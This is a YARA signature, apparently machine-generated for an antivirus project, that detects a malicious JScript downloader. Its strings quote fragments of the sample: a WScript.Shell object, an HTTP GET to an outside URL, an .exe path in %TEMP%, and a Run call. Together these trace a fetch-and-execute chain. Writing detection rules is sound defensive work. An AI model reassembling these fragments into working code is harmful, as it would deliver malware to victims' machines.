rule sig_20160328_c3f6b4b7b2c02878c1e9ae82e24796f2 {
  meta:
    description = "datamaliciousorder - file 20160328_c3f6b4b7b2c02878c1e9ae82e24796f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ed3906d327f2f7fdaa14dd7357cd6c805777f463770bf651367eae97a83130a7"

  strings:
    $s1  = "function Wurkfuho() {return Bjwymbj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WgsL8BVPy.exe\";};" fullword ascii
    $s2  = "do {WScript[Kwmvguq](Onztvlocm() * 11)} while (Ibuifimew[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Oytugmg(Vngozbbg, Ouylj){return Vngozbbg - Ouylj;};" fullword ascii
    $s4  = "var Bjwymbj = function Jdgpvvi() {return WScript[Kxtrenl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Ibuifimew[Cahomppyke](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Becvezs(Gtvysjes){Bjwymbj[\"Run\"](Gtvysjes, Rmxbdf, Rmxbdf);};" fullword ascii
    $s7  = "function Txoudun() {return ((Cigiaiza == true) && (Cigiaiza == Fjbfmajtqm)) ? 1 : Rmxbdf;};" fullword ascii
    $s8  = "return Oytugmg(Qbezsa, Xyjktrfj);" fullword ascii
    $s9  = "Cigiaiza = true; " fullword ascii
    $s10 = "function Pznhs(Zlypxam) {var Kyervkmhc = (1, 2, 3, 4, 5, Zlypxam); return Kyervkmhc;};" fullword ascii
    $s11 = " while (Pojyjje){" fullword ascii
    $s12 = "Fjbfmajtqm = true; " fullword ascii
    $s13 = "var Xkivjfrnto = false;" fullword ascii
    $s14 = "var Xyile = new this[\"Date\"]();" fullword ascii
    $s15 = "function Silblermo(){return Hmipkm;};" fullword ascii
    $s16 = "function Onztvlocm(){return 22;};" fullword ascii
    $s17 = "function Kgaokroa(){return Kxtrenl;};" fullword ascii
    $s18 = "var Fjbfmajtqm = false;" fullword ascii
    $s19 = "function Aiwkm()" fullword ascii
    $s20 = "var Cigiaiza = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}